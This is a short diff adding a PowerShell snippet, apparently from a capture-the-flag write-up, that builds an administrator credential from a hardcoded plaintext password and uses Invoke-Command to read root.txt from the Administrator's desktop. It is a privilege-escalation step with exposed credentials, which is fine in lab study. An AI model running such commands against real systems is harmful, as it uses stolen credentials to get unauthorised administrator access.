@@ -1,0 +1,6 @@
+powershell
+$pass = ConvertTo-SecureString '!R3m0te!' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential("Remote\Administrator", $pass)
+
+Invoke-Command -Computer localhost -Credential $cred -Authentication Default -ScriptBlock { type c:\Users\Administrator\Desktop\root.txt}
